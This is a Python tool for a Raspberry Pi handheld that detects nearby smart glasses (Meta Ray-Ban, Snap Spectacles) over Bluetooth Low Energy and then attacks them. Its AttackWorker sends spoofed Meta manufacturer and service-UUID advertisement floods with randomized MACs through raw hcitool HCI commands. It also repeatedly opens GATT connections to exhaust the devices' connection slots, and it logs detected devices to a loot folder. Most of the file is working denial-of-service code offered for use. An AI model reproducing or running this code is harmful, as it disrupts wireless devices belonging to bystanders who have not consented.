#!/usr/bin/env python3
"""
RaspyJack Payload -- Smart Glasses Counter-Attack
===================================================
Author: 7h30th3r0n3

Detects smart glasses via BLE (Meta Ray-Ban, Snap Spectacles, etc.)
then offers counter-attack modes to disrupt them via BLE flood/spam.

Based on research from:
  - Nearby Glasses (BLE Company ID detection)
  - Ban-Rays (IR + BLE fingerprinting)
  - BLE DoS / spam techniques

Setup / Prerequisites
---------------------
- Bluetooth adapter(s) (hci0 onboard + optional USB hci1)
- bleak for BLE scanning
- hcitool / hciconfig (bluez) for attack

Dual adapter mode:
  If 2+ BT adapters found, scan and attack run simultaneously.
  If 1 adapter only, alternates between scan (2s) and attack (2s).

Controls
--------
  OK          -- Start / stop scanning
  KEY1        -- Cycle attack mode (Flood / Beacon / Exhaust / ALL)
  KEY2        -- Start / stop attack
  LEFT/RIGHT  -- Navigate screens (monitor / attack / list)
  UP / DOWN   -- Scroll list or adjust attack speed
  KEY3        -- Exit (or back from sub-screen)

Loot: /root/Raspyjack/loot/GlassesCounter/
"""

from __future__ import annotations

import asyncio
import json
import os
import random
import subprocess
import sys
import threading
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageFont
    from payloads._display_helper import ScaledDraw, scaled_font

    LCD_AVAILABLE = True
except Exception:
    GPIO = None
    LCD_1in44 = None
    Image = None
    ImageFont = None
    LCD_AVAILABLE = False

from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface, list_bt_interfaces

try:
    from bleak import BleakScanner
except Exception:
    BleakScanner = None

try:
    from bluepy.btle import Scanner as BluepyScanner
except Exception:
    BluepyScanner = None

# ── Pin / LCD setup ──────────────────────────────────────────────────────────
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

WIDTH = LCD_1in44.LCD_WIDTH if LCD_1in44 else 128
HEIGHT = LCD_1in44.LCD_HEIGHT if LCD_1in44 else 128
FONT_PATH = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
FONT_BOLD = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"
LOOT_DIR = "/root/Raspyjack/loot/GlassesCounter"

# ── Smart Glasses BLE Identifiers ────────────────────────────────────────────

GLASSES_COMPANY_IDS = {
    0x01AB: ("Meta Platforms", "Meta Glasses"),
    0x058E: ("Meta Platforms Tech", "Meta Glasses"),
    0x0D53: ("Luxottica", "Ray-Ban Meta"),
    0x03C2: ("Snapchat", "Spectacles"),
}

GLASSES_SERVICE_UUIDS = {
    "0000fd5f-0000-1000-8000-00805f9b34fb": ("Meta", "Meta Glasses"),
}

GLASSES_NAME_PREFIXES = (
    "ray-ban", "meta", "spectacles", "snap ",
    "stories", "wayfarer",
)

# Attack company IDs to spoof (targeting Meta ecosystem)
ATTACK_COMPANY_IDS = [0x01AB, 0x058E, 0x0D53]
META_SERVICE_UUID_BYTES = bytes.fromhex("5ffd0000")  # 0xFD5F in service data format

ATTACK_MODES = ["Flood", "Beacon", "Exhaust", "ALL"]
SPEED_LEVELS = [200, 100, 50, 25]  # ms between attacks
SPEED_LABELS = ["Slow", "Med", "Fast", "Max"]
OFFLINE_TIMEOUT = 30
FLASH_CYCLES = 5
FLASH_DURATION_MS = 200


# ── Utilities ────────────────────────────────────────────────────────────────

def estimate_distance(rssi: int) -> str:
    if rssi >= -50:
        return "< 1m"
    if rssi >= -60:
        return "1-3m"
    if rssi >= -70:
        return "3-10m"
    if rssi >= -75:
        return "10-15m"
    if rssi >= -80:
        return "15-20m"
    return "> 20m"


def _short(s: str, n: int) -> str:
    s = str(s or "")
    return s if len(s) <= n else (s[: n - 1] + "." if n > 1 else s[:n])


def _age_text(ts: int) -> str:
    diff = max(0, int(time.time()) - int(ts))
    m, s = divmod(diff, 60)
    if m >= 60:
        h, m = divmod(m, 60)
        return f"{h}h{m}m"
    return f"{m}m{s}s"


# ── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class GlassesRecord:
    mac: str
    name: str
    brand: str
    model: str
    rssi: int
    company_id: int
    detection_method: str
    first_seen: int
    last_seen: int
    seen_count: int = 1

    @property
    def distance(self) -> str:
        return estimate_distance(self.rssi)

    @property
    def is_live(self) -> bool:
        return (int(time.time()) - self.last_seen) <= OFFLINE_TIMEOUT


@dataclass
class CounterState:
    # Detection
    glasses: Dict[str, GlassesRecord] = field(default_factory=dict)
    scan_enabled: bool = True
    total_ble_devices: int = 0
    scanner_backend: str = "init"
    scanner_health: str = "starting"
    last_error: str = ""
    events: deque = field(default_factory=lambda: deque(maxlen=50))
    # Alert
    alert_pending: bool = False
    alert_brand: str = ""
    alert_distance: str = ""
    # Attack
    attacking: bool = False
    attack_mode_idx: int = 0
    attack_speed_idx: int = 1
    attack_packets: int = 0
    attack_errors: int = 0
    attack_last_target: str = ""
    attack_status: str = "Idle"
    # UI
    current_screen: str = "monitor"
    selected_idx: int = 0
    running_since: int = field(default_factory=lambda: int(time.time()))
    # Adapter
    scan_hci: str = ""
    attack_hci: str = ""
    dual_adapter: bool = False

    def live_glasses(self) -> List[GlassesRecord]:
        return [g for g in self.glasses.values() if g.is_live]

    def all_sorted(self) -> List[GlassesRecord]:
        return sorted(self.glasses.values(), key=lambda g: g.rssi, reverse=True)

    def live_macs(self) -> List[str]:
        return [g.mac for g in self.glasses.values() if g.is_live]


state = CounterState()
state_lock = threading.RLock()
running = True


# ── Scanner Worker ───────────────────────────────────────────────────────────

class ScannerWorker:
    """BLE scanner that detects smart glasses via Company IDs."""

    def __init__(self) -> None:
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None

    def start(self) -> None:
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self) -> None:
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=3.0)

    def _run(self) -> None:
        if BleakScanner is not None:
            with state_lock:
                state.scanner_backend = "bleak"
                state.scanner_health = "running"
            try:
                asyncio.run(self._run_bleak())
                return
            except Exception as exc:
                with state_lock:
                    state.last_error = f"Bleak: {exc}"
                    state.scanner_health = "degraded"

        if BluepyScanner is not None:
            with state_lock:
                state.scanner_backend = "bluepy"
                state.scanner_health = "running"
            try:
                self._run_bluepy()
                return
            except Exception as exc:
                with state_lock:
                    state.last_error = f"Bluepy: {exc}"
                    state.scanner_health = "degraded"

        with state_lock:
            state.scanner_backend = "btctl"
            state.scanner_health = "running"
        self._run_bluetoothctl()

    async def _run_bleak(self) -> None:
        async def on_detect(device, adv_data) -> None:
            if self.stop_event.is_set() or not state.scan_enabled:
                return
            mac = str(device.address or "").lower()
            name = str(device.name or getattr(adv_data, "local_name", None) or "Unknown")
            rssi = int(getattr(adv_data, "rssi", None) or getattr(device, "rssi", -100))

            with state_lock:
                state.total_ble_devices += 1

            for company_id, mbytes in (adv_data.manufacturer_data or {}).items():
                if company_id in GLASSES_COMPANY_IDS:
                    brand, model = GLASSES_COMPANY_IDS[company_id]
                    self._record_glasses(mac, name, brand, model, rssi, company_id, "company_id")
                    return

            for uid in (adv_data.service_uuids or []):
                uid_lower = str(uid).lower()
                if uid_lower in GLASSES_SERVICE_UUIDS:
                    brand, model = GLASSES_SERVICE_UUIDS[uid_lower]
                    self._record_glasses(mac, name, brand, model, rssi, 0, "service_uuid")
                    return

            name_lower = name.lower()
            for prefix in GLASSES_NAME_PREFIXES:
                if name_lower.startswith(prefix):
                    self._record_glasses(mac, name, "Unknown", name, rssi, 0, "name")
                    return

        while not self.stop_event.is_set():
            # In single-adapter mode, pause scan while attacking
            with state_lock:
                if not state.dual_adapter and state.attacking:
                    pass  # still run scan briefly between attacks
            try:
                scanner = BleakScanner(detection_callback=on_detect)
                async with scanner:
                    t_end = time.monotonic() + 2.0
                    while time.monotonic() < t_end and not self.stop_event.is_set():
                        await asyncio.sleep(0.05)
            except Exception as exc:
                with state_lock:
                    state.last_error = f"scan: {_short(str(exc), 30)}"
                    state.scanner_health = "retrying"
                await asyncio.sleep(1.0)

    def _run_bluepy(self) -> None:
        while not self.stop_event.is_set():
            if not state.scan_enabled:
                time.sleep(0.2)
                continue
            try:
                scanner = BluepyScanner()
                devices = scanner.scan(2.0)
                with state_lock:
                    state.scanner_health = "running"
                for dev in devices:
                    if self.stop_event.is_set():
                        break
                    with state_lock:
                        state.total_ble_devices += 1
                    name = "Unknown"
                    for ad_type, desc, value in dev.getScanData():
                        sval = str(value or "").strip()
                        if desc in ("Complete Local Name", "Short Local Name") and sval:
                            name = sval
                        if ad_type == 0xFF and len(sval) >= 4:
                            try:
                                raw = bytes.fromhex(sval)
                                if len(raw) >= 2:
                                    cid = int.from_bytes(raw[:2], "little")
                                    if cid in GLASSES_COMPANY_IDS:
                                        brand, model = GLASSES_COMPANY_IDS[cid]
                                        mac = str(getattr(dev, "addr", "")).lower()
                                        rssi = int(getattr(dev, "rssi", -100))
                                        self._record_glasses(mac, name, brand, model, rssi, cid, "company_id")
                            except (ValueError, TypeError):
                                pass
            except Exception as exc:
                with state_lock:
                    state.last_error = f"bluepy: {_short(str(exc), 30)}"
                    state.scanner_health = "retrying"
                time.sleep(1.0)

    def _run_bluetoothctl(self) -> None:
        try:
            subprocess.run(["hciconfig", "hci0", "up"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=4)
        except Exception:
            pass
        btctl_proc = None
        while not self.stop_event.is_set():
            if not state.scan_enabled:
                time.sleep(0.2)
                continue
            try:
                if btctl_proc is None:
                    btctl_proc = subprocess.Popen(
                        ["bluetoothctl"], stdin=subprocess.PIPE,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True,
                    )
                    if btctl_proc.stdin:
                        btctl_proc.stdin.write("scan on\n")
                        btctl_proc.stdin.flush()
                proc = subprocess.run(
                    ["bluetoothctl", "devices"],
                    capture_output=True, text=True, timeout=8,
                )
                for line in (proc.stdout or "").splitlines():
                    parts = line.strip().split(None, 2)
                    if len(parts) >= 3 and parts[0] == "Device":
                        name = parts[2]
                        name_lower = name.lower()
                        for prefix in GLASSES_NAME_PREFIXES:
                            if name_lower.startswith(prefix):
                                mac = parts[1].lower()
                                self._record_glasses(mac, name, "Unknown", name, -99, 0, "name")
                                break
                        with state_lock:
                            state.total_ble_devices += 1
                with state_lock:
                    state.scanner_health = "running"
            except Exception as exc:
                with state_lock:
                    state.last_error = f"btctl: {_short(str(exc), 30)}"
            time.sleep(2.0)
        if btctl_proc:
            try:
                btctl_proc.terminate()
                btctl_proc.wait(timeout=2)
            except Exception:
                pass

    def _record_glasses(self, mac: str, name: str, brand: str, model: str,
                        rssi: int, company_id: int, method: str) -> None:
        now = int(time.time())
        with state_lock:
            if mac in state.glasses:
                rec = state.glasses[mac]
                rec.last_seen = now
                rec.rssi = rssi
                rec.seen_count += 1
                if name != "Unknown" and rec.name == "Unknown":
                    rec.name = name
            else:
                state.glasses[mac] = GlassesRecord(
                    mac=mac, name=name, brand=brand, model=model,
                    rssi=rssi, company_id=company_id,
                    detection_method=method,
                    first_seen=now, last_seen=now,
                )
                state.alert_pending = True
                state.alert_brand = brand
                state.alert_distance = estimate_distance(rssi)
            state.events.appendleft({
                "t": now, "mac": mac, "brand": brand,
                "model": model, "rssi": rssi,
            })


# ── Attack Worker ────────────────────────────────────────────────────────────

class AttackWorker:
    """BLE attack engine using hcitool HCI commands."""

    def __init__(self) -> None:
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None

    def start(self) -> None:
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self) -> None:
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=3.0)

    def _hci(self, args: List[str]) -> bool:
        """Run an hcitool command, return True on success."""
        with state_lock:
            hci_dev = state.attack_hci
        try:
            result = subprocess.run(
                ["sudo", "hcitool", "-i", hci_dev] + args,
                capture_output=True, timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False

    def _hciconfig(self, args: List[str]) -> bool:
        with state_lock:
            hci_dev = state.attack_hci
        try:
            result = subprocess.run(
                ["sudo", "hciconfig", hci_dev] + args,
                capture_output=True, timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False

    def _randomize_mac(self) -> None:
        """Set a random BLE static address."""
        mac_bytes = [random.randint(0, 255) for _ in range(6)]
        mac_bytes[0] |= 0xC0  # static random address
        mac_hex = [f"{b:02X}" for b in mac_bytes]
        self._hci(["cmd", "0x08", "0x0005"] + mac_hex)

    def _set_adv_params(self, interval_hex: str = "20") -> None:
        """Set LE advertising parameters: non-connectable, random address."""
        self._hci([
            "cmd", "0x08", "0x0006",
            interval_hex, "00",  # min interval
            interval_hex, "00",  # max interval
            "03",                # type: non-connectable undirected
            "01",                # own addr: random
            "00",                # peer addr type
            "00", "00", "00", "00", "00", "00",
            "07",                # channel map: all
            "00",                # filter: none
        ])

    def _set_adv_data(self, data: bytes) -> bool:
        """Set LE advertising data (max 31 bytes)."""
        payload = list(data)
        data_len = len(payload)
        while len(payload) < 30:
            payload.append(0x00)
        payload = payload[:30]
        full = [data_len] + payload
        hex_str = [f"{b:02X}" for b in full]
        return self._hci(["cmd", "0x08", "0x0008"] + hex_str)

    def _enable_adv(self) -> None:
        self._hci(["cmd", "0x08", "0x000a", "01"])

    def _disable_adv(self) -> None:
        self._hci(["cmd", "0x08", "0x000a", "00"])

    def _broadcast_once(self, adv_data: bytes, label: str) -> bool:
        """Send one advertisement cycle with randomized MAC."""
        try:
            self._disable_adv()
            self._randomize_mac()
            self._set_adv_params()
            if not self._set_adv_data(adv_data):
                # Reset and retry
                self._hciconfig(["reset"])
                time.sleep(0.2)
                self._hciconfig(["up"])
                self._randomize_mac()
                self._set_adv_params()
                if not self._set_adv_data(adv_data):
                    with state_lock:
                        state.attack_errors += 1
                    return False
            self._enable_adv()
            time.sleep(0.05)  # brief broadcast window
            self._disable_adv()
            with state_lock:
                state.attack_packets += 1
                state.attack_last_target = label
            return True
        except Exception:
            with state_lock:
                state.attack_errors += 1
            return False

    def _build_flood_packet(self) -> tuple:
        """Build fake Meta manufacturer data packet."""
        cid = random.choice(ATTACK_COMPANY_IDS)
        cid_lo = cid & 0xFF
        cid_hi = (cid >> 8) & 0xFF
        rand_data = bytes(random.randint(0, 255) for _ in range(20))
        adv = bytes([
            0x02, 0x01, 0x06,           # Flags: LE General + BR/EDR not supported
            len(rand_data) + 3, 0xFF,    # Length, Type=Manufacturer Specific
            cid_lo, cid_hi,              # Company ID (little-endian)
        ]) + rand_data
        return adv, f"Flood:0x{cid:04X}"

    def _build_beacon_packet(self) -> tuple:
        """Build fake Meta service UUID beacon."""
        rand_data = bytes(random.randint(0, 255) for _ in range(16))
        # Service Data with UUID 0xFD5F (Meta)
        adv = bytes([
            0x02, 0x01, 0x06,           # Flags
            0x03, 0x03, 0x5F, 0xFD,     # Complete 16-bit UUID: 0xFD5F
            len(rand_data) + 3, 0x16,   # Service Data
            0x5F, 0xFD,                  # UUID 0xFD5F (little-endian)
        ]) + rand_data
        return adv, "Beacon:FD5F"

    def _attack_exhaust_once(self) -> bool:
        """Attempt GATT connection to detected glasses MAC to exhaust slots."""
        with state_lock:
            macs = state.live_macs()
        if not macs:
            return False
        target_mac = random.choice(macs)
        with state_lock:
            hci_dev = state.attack_hci
        try:
            # Use gatttool to attempt connection (will likely fail/timeout)
            subprocess.run(
                ["sudo", "gatttool", "-i", hci_dev, "-b", target_mac, "--connect"],
                capture_output=True, timeout=3,
            )
            with state_lock:
                state.attack_packets += 1
                state.attack_last_target = f"Conn:{target_mac[-8:]}"
            return True
        except subprocess.TimeoutExpired:
            with state_lock:
                state.attack_packets += 1
                state.attack_last_target = f"Conn:{target_mac[-8:]}"
            return True
        except Exception:
            with state_lock:
                state.attack_errors += 1
            return False

    def _run(self) -> None:
        # Ensure adapter is up
        self._hciconfig(["up"])
        time.sleep(0.2)

        with state_lock:
            state.attack_status = "Running"

        while not self.stop_event.is_set():
            with state_lock:
                if not state.attacking:
                    break
                mode = ATTACK_MODES[state.attack_mode_idx]
                delay_ms = SPEED_LEVELS[state.attack_speed_idx]

            builders = []
            if mode in ("Flood", "ALL"):
                builders.append(("flood", self._build_flood_packet))
            if mode in ("Beacon", "ALL"):
                builders.append(("beacon", self._build_beacon_packet))

            if builders:
                kind, builder = random.choice(builders)
                adv_data, label = builder()
                self._broadcast_once(adv_data, label)

            if mode in ("Exhaust", "ALL"):
                self._attack_exhaust_once()

            time.sleep(delay_ms / 1000.0)

        # Cleanup
        self._disable_adv()
        self._hciconfig(["reset"])
        with state_lock:
            state.attack_status = "Idle"


# ── UI ───────────────────────────────────────────────────────────────────────

class Ui:
    def __init__(self) -> None:
        self.lcd = None
        self.font_small = None
        self.font_med = None
        self.font_big = None
        if LCD_AVAILABLE:
            self.lcd = LCD_1in44.LCD()
            self.lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            _s = getattr(LCD_1in44, "LCD_SCALE", 1.0)
            self.font_small = self._load_font(int(8 * _s))
            self.font_med = self._load_font(int(10 * _s))
            self.font_big = self._load_font(int(12 * _s), bold=True)

    def _load_font(self, size: int, bold: bool = False):
        try:
            return ImageFont.truetype(FONT_BOLD if bold else FONT_PATH, size)
        except Exception:
            return scaled_font()

    def flash_alert(self, brand: str, distance: str) -> None:
        if self.lcd is None:
            return
        for _ in range(FLASH_CYCLES):
            img = Image.new("RGB", (WIDTH, HEIGHT), "#FF0000")
            d = ScaledDraw(img)
            d.text((10, 30), "!! ALERT !!", font=self.font_big, fill="#FFFFFF")
            d.text((6, 55), "GLASSES DETECTED", font=self.font_med, fill="#FFFF00")
            d.text((10, 75), _short(brand, 18), font=self.font_med, fill="#FFFFFF")
            d.text((10, 92), f"Dist: {distance}", font=self.font_small, fill="#FFFFFF")
            self.lcd.LCD_ShowImage(img, 0, 0)
            time.sleep(FLASH_DURATION_MS / 1000.0)

            img = Image.new("RGB", (WIDTH, HEIGHT), "#FFAA00")
            d = ScaledDraw(img)
            d.text((10, 30), "!! ALERT !!", font=self.font_big, fill="#000000")
            d.text((6, 55), "GLASSES DETECTED", font=self.font_med, fill="#CC0000")
            d.text((10, 75), _short(brand, 18), font=self.font_med, fill="#000000")
            d.text((10, 92), f"Dist: {distance}", font=self.font_small, fill="#000000")
            self.lcd.LCD_ShowImage(img, 0, 0)
            time.sleep(FLASH_DURATION_MS / 1000.0)

    def draw(self) -> None:
        if self.lcd is None:
            return
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)

        with state_lock:
            screen = state.current_screen
            if screen == "monitor":
                self._screen_monitor(d)
            elif screen == "attack":
                self._screen_attack(d)
            elif screen == "list":
                self._screen_list(d)
            else:
                self._screen_monitor(d)

        self.lcd.LCD_ShowImage(img, 0, 0)

    def _header(self, d, title: str) -> None:
        with state_lock:
            scan_on = state.scan_enabled
            atk_on = state.attacking
        d.rectangle((0, 0, 127, 13), fill="#1A0A2E")
        d.text((2, 2), _short(title, 13), font=self.font_med, fill="#FF4444")
        # Scan indicator (left dot)
        scan_color = "#00FF00" if scan_on else "#FF0000"
        d.ellipse((108, 3, 116, 11), fill=scan_color)
        # Attack indicator (right dot)
        atk_color = "#FF00FF" if atk_on else "#333333"
        d.ellipse((118, 3, 126, 11), fill=atk_color)

    def _footer(self, d, txt: str) -> None:
        d.rectangle((0, 117, 127, 127), fill="#111111")
        d.text((1, 118), _short(txt, 26), font=self.font_small, fill="#A0A0A0")

    def _screen_monitor(self, d) -> None:
        self._header(d, "GLASS COUNTER")

        live = state.live_glasses()
        total = len(state.glasses)

        y = 16
        d.text((3, y), f"Live: {len(live)}", font=self.font_med,
               fill="#FF4444" if live else "#00FF7F")
        d.text((60, y), f"Total: {total}", font=self.font_med, fill="#CCCCCC")
        y += 14

        d.text((3, y), f"BLE: {state.total_ble_devices}", font=self.font_small, fill="#888888")
        mode_str = "Dual" if state.dual_adapter else "Single"
        d.text((60, y), f"Adapter: {mode_str}", font=self.font_small, fill="#888888")
        y += 12

        d.line([(0, y), (127, y)], fill="#333333")
        y += 3

        if live:
            closest = max(live, key=lambda g: g.rssi)
            d.rectangle((2, y, 125, y + 28), fill="#330000", outline="#FF4444")
            d.text((5, y + 2), f"{_short(closest.brand, 10)} {_short(closest.model, 10)}",
                   font=self.font_med, fill="#FF6666")
            d.text((5, y + 15), f"{closest.rssi}dBm  {closest.distance}",
                   font=self.font_small, fill="#FFAA00")
            y += 32
        else:
            d.text((3, y + 4), "No glasses found", font=self.font_med, fill="#555555")
            y += 20

        # Attack status
        atk_mode = ATTACK_MODES[state.attack_mode_idx]
        atk_status = state.attack_status
        atk_pkts = state.attack_packets
        atk_color = "#FF00FF" if state.attacking else "#666666"
        d.text((3, y + 4), f"ATK: {atk_mode} [{atk_status}]",
               font=self.font_small, fill=atk_color)
        d.text((3, y + 15), f"Packets: {atk_pkts}",
               font=self.font_small, fill="#888888")

        if state.last_error:
            d.text((3, 104), _short(state.last_error, 24),
                   font=self.font_small, fill="#FF4444")

        lbl = "OK:Stop" if state.scan_enabled else "OK:Scan"
        self._footer(d, f"{lbl} R:Atk K3:Exit")

    def _screen_attack(self, d) -> None:
        self._header(d, "ATTACK PANEL")

        y = 18
        mode = ATTACK_MODES[state.attack_mode_idx]
        speed_lbl = SPEED_LABELS[state.attack_speed_idx]
        speed_ms = SPEED_LEVELS[state.attack_speed_idx]

        mode_colors = {
            "Flood": "#FF4444", "Beacon": "#4488FF",
            "Exhaust": "#FFAA00", "ALL": "#FF00FF",
        }

        d.text((3, y), f"Mode: {mode}", font=self.font_med,
               fill=mode_colors.get(mode, "#FFFFFF"))
        y += 14

        d.text((3, y), f"Speed: {speed_lbl} ({speed_ms}ms)",
               font=self.font_small, fill="#888888")
        y += 12

        d.text((3, y), f"Packets sent: {state.attack_packets}",
               font=self.font_med, fill="#00FF00")
        y += 14

        if state.attack_last_target:
            d.text((3, y), f"Last: {_short(state.attack_last_target, 22)}",
                   font=self.font_small, fill="#CCCCCC")
        y += 12

        if state.attack_errors:
            d.text((3, y), f"Errors: {state.attack_errors}",
                   font=self.font_small, fill="#FF4444")
        y += 14

        # Target info
        live = state.live_glasses()
        d.text((3, y), f"Targets: {len(live)} glasses live",
               font=self.font_small, fill="#FFAA00")
        y += 12

        # Adapter info
        d.text((3, y), f"ATK on: {state.attack_hci}",
               font=self.font_small, fill="#666666")

        # Mode descriptions
        descs = {
            "Flood": "Spam Meta Company IDs",
            "Beacon": "Fake Meta UUID beacons",
            "Exhaust": "GATT conn exhaustion",
            "ALL": "All attack vectors",
        }
        d.text((3, 104), descs.get(mode, ""), font=self.font_small, fill="#444444")

        atk_lbl = "K2:Stop" if state.attacking else "K2:Attack"
        self._footer(d, f"K1:Mode {atk_lbl} U/D:Spd")

    def _screen_list(self, d) -> None:
        self._header(d, "GLASSES LIST")

        glasses_list = state.all_sorted()
        total = len(glasses_list)

        if not glasses_list:
            d.text((4, 40), "No glasses found", font=self.font_med, fill="#888888")
            self._footer(d, "L:Back K3:Exit")
            return

        state.selected_idx = max(0, min(state.selected_idx, total - 1))

        rows_visible = 7
        start = (state.selected_idx // rows_visible) * rows_visible
        y = 16

        for i in range(start, min(start + rows_visible, total)):
            rec = glasses_list[i]
            sel = i == state.selected_idx

            if sel:
                d.rectangle((0, y - 1, 127, y + 12), fill="#1A2B3A")

            status_dot = "#00FF00" if rec.is_live else "#666666"
            d.ellipse((2, y + 3, 6, y + 7), fill=status_dot)

            color = "#FFFFFF" if sel else "#CCCCCC"
            d.text((9, y), _short(rec.brand, 8), font=self.font_small, fill=color)
            d.text((58, y), f"{rec.rssi}dB", font=self.font_small, fill="#FFAA00")
            d.text((92, y), _short(rec.distance, 6), font=self.font_small, fill="#88CCFF")
            y += 14

        self._footer(d, "L:Back U/D:Scroll K3:Exit")


# ── Export ───────────────────────────────────────────────────────────────────

def export_json() -> str:
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"counter_{ts}.json")
    with state_lock:
        data = {
            "timestamp": ts,
            "attack_packets": state.attack_packets,
            "attack_mode": ATTACK_MODES[state.attack_mode_idx],
            "glasses": [
                {
                    "mac": g.mac, "name": g.name, "brand": g.brand,
                    "model": g.model, "rssi": g.rssi, "distance": g.distance,
                    "company_id": f"0x{g.company_id:04X}" if g.company_id else None,
                    "seen_count": g.seen_count,
                }
                for g in state.glasses.values()
            ],
        }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    global running

    if LCD_AVAILABLE:
        GPIO.setmode(GPIO.BCM)
        for pin in PINS.values():
            GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    ui = Ui()

    # Detect BT adapters
    bt_ifaces = list_bt_interfaces()
    if not bt_ifaces:
        if ui.lcd:
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ScaledDraw(img)
            d.text((4, 50), "No BT adapter found!", font=ui.font_med, fill="#FF4444")
            ui.lcd.LCD_ShowImage(img, 0, 0)
            time.sleep(2)
            GPIO.cleanup()
        return 1

    # Assign adapters
    with state_lock:
        if len(bt_ifaces) >= 2:
            state.dual_adapter = True
            state.scan_hci = bt_ifaces[0]["name"]
            state.attack_hci = bt_ifaces[1]["name"]
        else:
            state.dual_adapter = False
            state.scan_hci = bt_ifaces[0]["name"]
            state.attack_hci = bt_ifaces[0]["name"]

    # Ensure adapters are up
    for ifc in bt_ifaces[:2]:
        subprocess.run(["sudo", "hciconfig", ifc["name"], "up"],
                       capture_output=True, timeout=5)

    # Splash
    if ui.lcd:
        img = Image.new("RGB", (WIDTH, HEIGHT), "#0A0A1A")
        d = ScaledDraw(img)
        d.text((6, 6), "SMART GLASSES", font=ui.font_big, fill="#FF4444")
        d.text((12, 22), "COUNTER", font=ui.font_big, fill="#FF00FF")
        d.text((4, 44), "Detect & disrupt smart", font=ui.font_small, fill="#888888")
        d.text((4, 56), "glasses via BLE", font=ui.font_small, fill="#888888")

        with state_lock:
            dual = state.dual_adapter
            s_hci = state.scan_hci
            a_hci = state.attack_hci
        if dual:
            d.text((4, 72), f"Scan: {s_hci}  Atk: {a_hci}",
                   font=ui.font_small, fill="#00FF00")
        else:
            d.text((4, 72), f"Single adapter: {s_hci}",
                   font=ui.font_small, fill="#FFAA00")
            d.text((4, 84), "(alternating mode)", font=ui.font_small, fill="#888888")

        d.text((4, 100), "OK=Scan K2=Attack", font=ui.font_small, fill="#555555")
        d.text((4, 112), "K1=Mode K3=Exit", font=ui.font_small, fill="#555555")
        ui.lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(2.0)

    # Start scanner
    scanner = ScannerWorker()
    scanner.start()
    attacker = AttackWorker()

    try:
        while running:
            # Check alert
            with state_lock:
                if state.alert_pending:
                    brand = state.alert_brand
                    distance = state.alert_distance
                    state.alert_pending = False
                else:
                    brand = None

            if brand:
                ui.flash_alert(brand, distance)

            # Input
            btn = get_button(PINS, GPIO) if LCD_AVAILABLE else None

            with state_lock:
                screen = state.current_screen

            if btn == "KEY3":
                if screen != "monitor":
                    with state_lock:
                        state.current_screen = "monitor"
                    time.sleep(0.2)
                else:
                    break

            elif btn == "OK":
                with state_lock:
                    state.scan_enabled = not state.scan_enabled
                time.sleep(0.3)

            elif btn == "KEY1":
                with state_lock:
                    state.attack_mode_idx = (state.attack_mode_idx + 1) % len(ATTACK_MODES)
                time.sleep(0.25)

            elif btn == "KEY2":
                with state_lock:
                    currently_attacking = state.attacking
                if currently_attacking:
                    with state_lock:
                        state.attacking = False
                    attacker.stop()
                else:
                    with state_lock:
                        state.attacking = True
                    attacker = AttackWorker()
                    attacker.start()
                time.sleep(0.3)

            elif btn == "RIGHT":
                with state_lock:
                    if state.current_screen == "monitor":
                        state.current_screen = "attack"
                    elif state.current_screen == "attack":
                        state.current_screen = "list"
                time.sleep(0.2)

            elif btn == "LEFT":
                with state_lock:
                    if state.current_screen == "list":
                        state.current_screen = "attack"
                    elif state.current_screen == "attack":
                        state.current_screen = "monitor"
                time.sleep(0.2)

            elif btn == "UP":
                with state_lock:
                    if state.current_screen == "attack":
                        state.attack_speed_idx = max(0, state.attack_speed_idx - 1)
                    elif state.current_screen == "list":
                        state.selected_idx = max(0, state.selected_idx - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                with state_lock:
                    if state.current_screen == "attack":
                        state.attack_speed_idx = min(
                            len(SPEED_LEVELS) - 1, state.attack_speed_idx + 1)
                    elif state.current_screen == "list":
                        max_idx = max(0, len(state.glasses) - 1)
                        state.selected_idx = min(max_idx, state.selected_idx + 1)
                time.sleep(0.15)

            ui.draw()
            time.sleep(0.05)

    finally:
        with state_lock:
            state.attacking = False
        attacker.stop()
        scanner.stop()
        # Export results on exit
        if state.glasses:
            export_json()
        if ui.lcd:
            try:
                ui.lcd.LCD_Clear()
            except Exception:
                pass
        if LCD_AVAILABLE:
            GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
